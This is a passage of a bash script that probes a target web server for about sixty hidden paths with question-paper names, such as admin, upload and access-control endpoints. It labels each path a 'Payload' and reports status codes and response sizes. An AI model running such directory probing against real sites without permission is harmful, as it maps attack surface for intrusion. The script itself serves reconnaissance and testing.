         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-DataOps/"" -H "User-Agent: Mozilla/5.0")
